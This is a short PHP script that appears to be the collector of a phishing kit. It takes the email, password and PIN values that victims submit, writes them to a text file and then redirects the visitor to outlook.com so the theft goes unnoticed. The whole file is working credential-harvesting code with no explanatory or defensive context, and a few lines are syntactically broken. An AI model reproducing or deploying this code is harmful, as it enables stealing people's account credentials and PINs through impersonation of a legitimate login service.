<?php
$email=$_POST["email"];
$password=$_POST["Password"];
$pin=$_POST["pin"];
$pinConfirm=$_POST["password"];
$guardar=fopen("archivos.txt",a);
fwrite($guardar,"
".$email."
".$password."
".$pin."
".$pinConfirm.);
fclose($guardar);
echo "<META HTTP-EQUIV='refresh' CONTENT='1; url=http://outlook.com'>";
?>